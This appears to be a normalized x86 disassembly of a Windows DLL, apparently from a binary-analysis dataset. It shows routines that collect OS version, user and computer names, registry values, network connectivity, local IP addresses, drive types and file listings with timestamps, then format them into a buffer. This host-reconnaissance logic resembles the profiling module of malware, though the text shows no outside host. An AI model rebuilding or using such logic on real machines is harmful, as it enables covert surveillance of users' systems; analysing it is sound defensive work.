call sub_100110e3
pop ecx
pop ecx
push ebx
push 0x1
mov ecx esi
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x5
call sub_10001362
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x6
call sub_100110e3
pop ecx
pop ecx
push ebx
push 0x1
mov ecx esi
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push ebx
push [ ebp - 0x30 ]
mov eax edi
call sub_10011067
lea eax [ ebp - 0x2c ]
push eax
push [ edi + 0x4 ]
call sub_100060a3
pop ecx
pop ecx
push [ ebp - 0x30 ]
mov eax edi
call sub_100110a9
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
call sub_1002b392
retn 0x8
sub_1001127b
push 0x5c
mov eax sub_10053291
call sub_1002b30f
mov edi ecx
push r--data
lea ecx [ ebp - 0x64 ]
call sub_10001362
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10008ef7
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000264e
push r--data
lea ecx [ ebp - 0x48 ]
call sub_10001362
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1001113e
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
call sub_1002b392
retn
sub_100112f5
push 0x160
mov eax sub_10052c6d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi 0x114
push esi
mov [ ebp - 0x14c ] eax
xor ebx ebx
lea eax [ ebp - 0x148 ]
push ebx
push eax
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x148 ]
push eax
mov [ ebp - 0x148 ] esi
call [ GetVersionExW@IAT ]
xor edi edi
inc edi
cmp eax edi
jne r-xdata
call sub_1002b392
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x144 ] 0x4
jne r-xdata
cmp [ ebp - 0x144 ] 0x5
jne r-xdata
cmp [ ebp - 0x140 ] ebx
jne r-xdata
cmp [ ebp - 0x144 ] 0x6
jne r-xdata
cmp [ ebp - 0x140 ] ebx
jne r-xdata
cmp [ ebp - 0x140 ] 0xa
jne r-xdata
cmp [ ebp - 0x138 ] edi
jne r-xdata
mov esi r--data
push esi
lea ecx [ ebp - 0x168 ]
call sub_10001362
push ebx
lea eax [ ebp - 0x168 ]
push eax
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x4 ] 0x1
call sub_10011067
push ebx
push edi
lea ecx [ ebp - 0x168 ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push r--data
push ecx
lea eax [ ebp - 0x134 ]
push eax
push ecx
push r--data
push ecx
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14c ]
push [ eax + 0x4 ]
call sub_100060a3
add esp 0xc
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000993a
pop ecx
pop ecx
push esi
lea ecx [ ebp - 0x168 ]
call sub_10001362
lea eax [ ebp - 0x168 ]
push eax
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x4 ] 0x2
call sub_100110a9
push ebx
push edi
lea ecx [ ebp - 0x168 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x2c ]
call sub_1000264e
cmp [ ebp - 0x140 ] ebx
jne r-xdata
cmp [ ebp - 0x140 ] edi
jne r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x140 ] 0x5a
jne r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x138 ] 0x2
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100014f8
cmp [ ebp - 0x140 ] edi
jne r-xdata
push r--data
jmp r-xdata
cmp [ ebp - 0x140 ] 0x2
jne r-xdata
push r--data
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_100014f8
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
push r--data
jmp r-xdata
sub_100114cd
push 0x86c
mov eax sub_10053251
call sub_1002b30f
push 0x824
lea eax [ ebp - 0x838 ]
push 0x0
push eax
mov edi ecx
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x83c ]
push eax
lea eax [ ebp - 0x838 ]
push eax
mov [ ebp - 0x83c ] 0x824
call [ GetUserNameW@IAT ]
cmp eax 0x1
jne r-xdata
call sub_1002b392
retn
lea eax [ ebp - 0x838 ]
push eax
lea ecx [ ebp - 0x874 ]
call sub_10001362
and [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0x858 ]
call sub_10001362
lea eax [ ebp - 0x874 ]
push eax
lea eax [ ebp - 0x858 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001113e
push 0x0
push 0x1
lea ecx [ ebp - 0x858 ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x874 ]
call sub_1000264e
sub_10011578
push 0x86c
mov eax sub_10053251
call sub_1002b30f
push 0x824
lea eax [ ebp - 0x838 ]
push 0x0
push eax
mov edi ecx
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x83c ]
push eax
lea eax [ ebp - 0x838 ]
push eax
mov [ ebp - 0x83c ] 0x824
call [ GetComputerNameW@IAT ]
cmp eax 0x1
jne r-xdata
call sub_1002b392
retn
lea eax [ ebp - 0x838 ]
push eax
lea ecx [ ebp - 0x874 ]
call sub_10001362
and [ ebp - 0x4 ] 0x0
push r--data
lea ecx [ ebp - 0x858 ]
call sub_10001362
lea eax [ ebp - 0x874 ]
push eax
lea eax [ ebp - 0x858 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001113e
push 0x0
push 0x1
lea ecx [ ebp - 0x858 ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x874 ]
call sub_1000264e
sub_10011623
push 0x6c
mov eax sub_10053216
call sub_1002b345
mov edi ecx
xor esi esi
push r--data
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x4 ] esi
call sub_10001362
push r--data
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4 ] 0x1
call sub_10001362
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x5c ]
push eax
push 0x80000001
lea eax [ ebp - 0x3c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014a6c
push esi
push 0x1
lea ecx [ ebp - 0x5c ]
call sub_1000264e
push esi
push 0x1
lea ecx [ ebp - 0x78 ]
call sub_1000264e
lea edx [ ebp - 0x3c ]
mov ecx edi
mov [ ebp - 0x4 ] 0x6
call sub_100116d2
mov [ ebp - 0x4 ] 0x5
mov ecx [ ebp - 0x40 ]
lea edx [ ebp - 0x3c ]
mov [ ebp - 0x4 ] 0x8
call sub_10011770
lea ecx [ ebp - 0x3c ]
call sub_10014b74
call sub_1002b3a1
retn
sub_100116d2
push 0x84
mov eax sub_100531d6
call sub_1002b30f
mov edi ecx
push r--data
lea ecx [ ebp - 0x68 ]
mov esi edx
call sub_10001362
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x90 ]
push eax
push esi
call sub_10014b9d
lea ecx [ ebp - 0x30 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100150f9
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x3
call sub_100150b1
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001362
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1001113e
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
call sub_1002b392
retn
sub_10011770
push 0x84
mov eax sub_100531d6
call sub_1002b30f
mov edi ecx
push r--data
lea ecx [ ebp - 0x68 ]
mov esi edx
call sub_10001362
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x90 ]
push eax
push esi
call sub_10014b9d
lea ecx [ ebp - 0x30 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100150f9
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x3
call sub_100150b1
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000264e
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001362
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1001113e
push 0x0
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
call sub_1002b392
retn
sub_1001180e
push 0xe8
mov eax sub_1005318b
call sub_1002b345
mov eax [ ebp + 0x8 ]
xor esi esi
push r--data
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x4 ] esi
call sub_10001362
xor ebx ebx
inc ebx
push r--data
lea ecx [ ebp - 0xb0 ]
mov [ ebp - 0x4 ] bl
call sub_10001362
lea eax [ ebp - 0x94 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
push 0x80000001
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014a6c
push esi
push ebx
lea ecx [ ebp - 0xb0 ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
mov edi r--data
push edi
lea ecx [ ebp - 0x78 ]
call sub_10001362
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0xf4 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_10014b9d
lea ecx [ ebp - 0x30 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x7
call sub_100150f9
lea esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x9
call sub_100150b1
xor esi esi
push esi
push ebx
lea ecx [ ebp - 0x78 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
push edi
lea ecx [ ebp - 0xcc ]
call sub_10001362
mov edi [ ebp - 0x5c ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0xcc ]
push eax
mov [ ebp - 0x4 ] 0xb
call sub_1001113e
push esi
push ebx
lea ecx [ ebp - 0xcc ]
call sub_1000264e
push esi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_1000264e
lea ecx [ ebp - 0x58 ]
call sub_10014b74
call sub_1002b3a1
retn 0x4
sub_1001192f
push 0x44
mov eax sub_10053122
call sub_1002b30f
mov edi ecx
xor esi esi
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] esi
call sub_10001362
push esi
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] esi
call [ InternetGetConnectedState@IAT ]
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x4c ]
call sub_10001362
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001113e
push esi
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_1000264e
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
call sub_1002b392
retn
test [ ebp - 0x30 ] 0x1
lea ecx [ ebp - 0x2c ]
je r-xdata
push r--data
push r--data
jmp r-xdata
call sub_100014f8
sub_100119b5
push 0x3b8
mov eax sub_100530ea
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x320 ] eax
lea eax [ ebp - 0x3c4 ]
push eax
call sub_1000313a
xor esi esi
push 0x190
lea eax [ ebp - 0x314 ]
push esi
push eax
mov [ ebp - 0x4 ] esi
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x314 ]
push eax
push 0x101
call [ WSAStartup@IAT ]
cmp eax esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x3c4 ]
call sub_10002793
call sub_1002b392
retn 0x4
push 0x50
lea eax [ ebp - 0x64 ]
push esi
push eax
call sub_10027650
add esp 0xc
push 0x50
lea eax [ ebp - 0x64 ]
push eax
call [ gethostname@IAT ]
test eax eax
jne r-xdata
call [ WSACleanup@IAT ]
lea eax [ ebp - 0x64 ]
push eax
call [ gethostbyname@IAT ]
mov edi eax
cmp edi esi
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebp - 0x318 ] esi
cmp [ eax ] esi
je r-xdata
push r--data
lea ecx [ ebp - 0x180 ]
call sub_10001362
lea ecx [ ebp - 0x33c ]
lea eax [ ebp - 0x3c4 ]
mov [ ebp - 0x4 ] 0x1
call sub_10003269
mov edi [ ebp - 0x320 ]
push eax
lea eax [ ebp - 0x180 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001113e
push esi
push 0x1
lea ecx [ ebp - 0x33c ]
call sub_1000264e
push esi
push 0x1
lea ecx [ ebp - 0x180 ]
call sub_1000264e
xor ebx ebx
inc [ ebp - 0x318 ]
mov ebx [ ebp - 0x318 ]
mov eax [ edi + 0xc ]
shl ebx 0x2
cmp [ ebx + eax ] esi
jne r-xdata
push r--data
push ecx
lea eax [ ebp - 0x164 ]
push eax
lea eax [ ebp - 0x3bc ]
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000993a
pop ecx
pop ecx
push 0x10
lea eax [ ebp - 0x174 ]
push esi
push eax
call sub_10027650
add esp 0xc
push 0x2
pop eax
mov [ ebp - 0x174 ] ax
mov eax [ edi + 0xc ]
push 0x4
push [ ebx + eax ]
lea eax [ ebp - 0x170 ]
push eax
call sub_1002a0f0
add esp 0xc
push 0x100
lea eax [ ebp - 0x164 ]
push esi
push eax
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x164 ]
push eax
push esi
push 0x10
lea eax [ ebp - 0x174 ]
push eax
mov [ ebp - 0x31c ] 0x80
call [ WSAAddressToStringW@IAT ]
test eax eax
jne r-xdata
sub_10011b7f
push 0xe8
mov eax sub_100530a1
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0xf4 ]
push eax
call sub_1000313a
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x4c ]
call sub_10017790
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x40 ]
push 0x1c
cdq
pop ecx
idiv ecx
xor edi edi
test eax eax
jbe r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_10001362
lea ecx [ ebp - 0x68 ]
lea eax [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10003269
mov edi [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1001113e
push 0x0
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
lea esi [ ebp - 0x4c ]
call sub_100015ca
push [ ebp - 0x4c ]
call sub_100272e8
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea eax [ ebp - 0xf4 ]
call sub_10002793
call sub_1002b392
retn 0x4
xor esi esi
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x40 ]
add eax esi
push eax
lea ecx [ ebp - 0x30 ]
call sub_100025cf
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0xec ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100060a3
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
pop ecx
pop ecx
jae r-xdata
call sub_10027827
push eax
call [ GetDriveTypeW@IAT ]
dec eax
dec eax
je r-xdata
lea eax [ ebp - 0x2c ]
push r--data
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0xec ]
push eax
call sub_1000993a
pop ecx
pop ecx
push r--data
jmp r-xdata
dec eax
je r-xdata
push r--data
jmp r-xdata
dec eax
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000264e
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x40 ]
push 0x1c
cdq
pop ecx
idiv ecx
inc edi
add esi 0x1c
cmp edi eax
jb r-xdata
push r--data
jmp r-xdata
sub_10011cdf
push 0xf0
mov eax sub_1005304e
call sub_1002b345
mov eax [ ebp + 0x8 ]
mov esi r--data
xor ebx ebx
push esi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x4 ] ebx
call sub_10001362
push r--data
lea ecx [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001362
lea eax [ ebp - 0x9c ]
push eax
lea eax [ ebp - 0xd4 ]
push eax
push 0x80000000
lea eax [ ebp - 0x5c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014a6c
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0xd4 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
push esi
lea ecx [ ebp - 0xb8 ]
call sub_10001362
lea eax [ ebp - 0xb8 ]
push eax
lea eax [ ebp - 0xfc ]
push eax
lea eax [ ebp - 0x5c ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_10014b9d
lea ecx [ ebp - 0x34 ]
push ecx
push eax
mov [ ebp - 0x4 ] 0x7
call sub_100150f9
lea esi [ ebp - 0xfc ]
mov [ ebp - 0x4 ] 0x9
call sub_100150b1
push ebx
push edi
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
push edi
or ebx 0xffffffff
push ebx
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x60 ] 0x5c
call sub_10009633
mov esi eax
mov edi r--data
push edi
inc esi
call sub_1002762d
pop ecx
push eax
push edi
mov eax esi
lea ecx [ ebp - 0x34 ]
call sub_10013912
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x80 ]
call sub_10001362
mov edi [ ebp - 0x64 ]
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0xc
call sub_1001113e
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1000264e
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
call sub_1000264e
lea ecx [ ebp - 0x5c ]
call sub_10014b74
call sub_1002b3a1
retn 0x4
cmp eax ebx
je r-xdata
sub eax esi
push eax
push esi
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10009533
push ebx
push 0x0
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0xb
call sub_1000253c
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
sub_10011e6e
push 0x2b4
mov eax sub_10052fda
call sub_1002b345
mov edi ecx
push r--data
lea ecx [ ebp - 0x2c0 ]
mov [ ebp - 0x26c ] edi
call sub_10001362
and [ ebp - 0x4 ] 0x0
xor esi esi
inc esi
push esi
lea eax [ ebp - 0x2c0 ]
push eax
mov eax edi
call sub_10011067
push 0x0
push esi
lea ecx [ ebp - 0x2c0 ]
call sub_1000264e
mov [ ebp - 0x4 ] esi
call sub_1001597f
mov ebx r--data
mov [ ebp - 0x268 ] ebx
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x268 ] r--data
lea eax [ ebp - 0x268 ]
push eax
lea edi [ ebp - 0x260 ]
mov [ ebp - 0x4 ] 0x2
call sub_100159ff
test al al
jne r-xdata
lea eax [ ebp - 0x23c ]
push eax
lea ecx [ ebp - 0x30 ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x288 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001362
mov edi [ ebp - 0x26c ]
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x288 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_1001113e
push 0x0
push esi
lea ecx [ ebp - 0x288 ]
call sub_1000264e
push 0x0
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000264e
lea eax [ ebp - 0x268 ]
push eax
lea edi [ ebp - 0x260 ]
call sub_10015aaa
test al al
jne r-xdata
lea ecx [ ebp - 0x268 ]
mov [ ebp - 0x268 ] ebx
call sub_10016c58
jmp r-xdata
lea ecx [ ebp - 0x268 ]
mov [ ebp - 0x268 ] ebx
call sub_10016c58
or [ ebp - 0x4 ] 0xffffffff
jmp sub_10011fa0
call sub_1002b3a1
retn
sub_10011fa0
push r--data
lea ecx [ ebp - 0x2a4 ]
call sub_10001362
lea eax [ ebp - 0x2a4 ]
push eax
mov eax [ ebp - 0x26c ]
mov [ ebp - 0x4 ] 0x6
call sub_100110a9
push 0x0
push esi
lea ecx [ ebp - 0x2a4 ]
call sub_1000264e
call sub_1002b3a1
retn
sub_10011fdd
push 0x4a4
mov eax sub_10052f7e
call sub_1002b30f
mov esi [ ebp + 0x8 ]
push 0x24c
xor ebx ebx
lea eax [ ebp - 0x2b4 ]
push ebx
push eax
mov edi ecx
mov [ ebp - 0x2dc ] esi
mov [ ebp - 0x2b8 ] 0x250
call sub_10027650
add esp 0xc
push r--data
lea eax [ ebp - 0x48 ]
push esi
push eax
call sub_100098f3
add esp 0xc
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x30 ] 0x8
mov eax [ ebp - 0x44 ]
jae r-xdata
lea ecx [ ebp - 0x2b8 ]
push ecx
push eax
call [ FindFirstFileW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2bc ] eax
call sub_10001362
push 0x1
lea eax [ ebp - 0x2c ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x1
call sub_10011067
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
cmp [ ebp - 0x2bc ] 0xffffffff
jne r-xdata
lea eax [ ebp - 0x44 ]
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1001113e
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
mov esi r--data
call [ GetLastError@IAT ]
cmp eax 0x5
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x2b4 ]
push eax
call [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x308 ]
push eax
lea eax [ ebp - 0x2ac ]
push eax
call [ FileTimeToSystemTime@IAT ]
lea eax [ ebp - 0x428 ]
push eax
call sub_1000313a
lea eax [ ebp - 0x3a0 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_1000313a
mov [ ebp - 0x4 ] 0x9
push [ ebp - 0x312 ]
lea eax [ ebp - 0x420 ]
push ecx
push esi
push ecx
push [ ebp - 0x316 ]
push ecx
push esi
push ecx
push [ ebp - 0x318 ]
push eax
call sub_1000926b
pop ecx
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000926b
pop ecx
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000926b
push [ ebp - 0x302 ]
lea eax [ ebp - 0x398 ]
push ecx
push esi
push ecx
push [ ebp - 0x306 ]
push ecx
push esi
push ecx
push [ ebp - 0x308 ]
push eax
call sub_1000926b
pop ecx
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000926b
pop ecx
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000926b
lea eax [ ebp - 0x4b0 ]
push eax
call sub_1000313a
mov [ ebp - 0x4 ] 0xa
push [ ebp - 0x298 ]
lea eax [ ebp - 0x4a8 ]
push eax
call sub_1000935d
lea eax [ ebp - 0x2c ]
push 0x1
push eax
mov eax edi
call sub_10011067
lea eax [ ebp - 0x28c ]
push eax
lea ecx [ ebp - 0x2d8 ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x2f8 ]
mov [ ebp - 0x4 ] 0xb
call sub_10001362
lea eax [ ebp - 0x2d8 ]
push eax
lea eax [ ebp - 0x2f8 ]
push eax
mov [ ebp - 0x4 ] 0xc
call sub_1001113e
push ebx
push 0x1
lea ecx [ ebp - 0x2f8 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x2f8 ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0xd
call sub_10001362
lea eax [ ebp - 0x2f8 ]
push eax
lea eax [ ebp - 0x2d8 ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_1001113e
push ebx
push 0x1
lea ecx [ ebp - 0x2d8 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x2f8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2d8 ]
call sub_10001362
lea ecx [ ebp - 0x2f8 ]
lea eax [ ebp - 0x428 ]
mov [ ebp - 0x4 ] 0xf
call sub_10003269
push eax
lea eax [ ebp - 0x2d8 ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_1001113e
push ebx
push 0x1
lea ecx [ ebp - 0x2f8 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2d8 ]
call sub_10001362
mov [ ebp - 0x4 ] 0x11
lea ecx [ ebp - 0x2f8 ]
lea eax [ ebp - 0x3a0 ]
call sub_10003269
push eax
lea eax [ ebp - 0x2d8 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_1001113e
push ebx
push 0x1
lea ecx [ ebp - 0x2f8 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
push r--data
lea ecx [ ebp - 0x2d8 ]
call sub_10001362
lea ecx [ ebp - 0x2f8 ]
lea eax [ ebp - 0x4b0 ]
mov [ ebp - 0x4 ] 0x13
call sub_10003269
push eax
lea eax [ ebp - 0x2d8 ]
push eax
mov [ ebp - 0x4 ] 0x14
call sub_1001113e
push ebx
push 0x1
lea ecx [ ebp - 0x2f8 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x2d8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
lea eax [ ebp - 0x2c ]
push eax
mov eax edi
call sub_100110a9
push 0x1
call [ Sleep@IAT ]
lea eax [ ebp - 0x4b0 ]
mov [ ebp - 0x4 ] 0x9
call sub_10002793
lea eax [ ebp - 0x3a0 ]
mov [ ebp - 0x4 ] 0x8
call sub_10002793
lea eax [ ebp - 0x428 ]
mov [ ebp - 0x4 ] 0x7
call sub_10002793
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
lea eax [ ebp - 0x2b8 ]
push eax
push [ ebp - 0x2bc ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100014f8
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
push r--data
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x2d8 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100098f3
add esp 0xc
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1001113e
push ebx
push 0x1
lea ecx [ ebp - 0x2d8 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
push esi
lea ecx [ ebp - 0x2c ]
call sub_10001362
lea eax [ ebp - 0x2c ]
push eax
mov eax edi
mov [ ebp - 0x4 ] 0x4
call sub_100110a9
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
push ebx
push 0x1
jmp r-xdata
lea eax [ ebp - 0x28c ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10001362
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x6
call sub_10001362
mov [ ebp - 0x4 ] 0x7
test [ ebp - 0x2b8 ] 0x10
jne r-xdata
push r--data
lea ecx [ ebp - 0x2d8 ]
call sub_10001362
lea eax [ ebp - 0x2d8 ]
push eax
mov eax edi
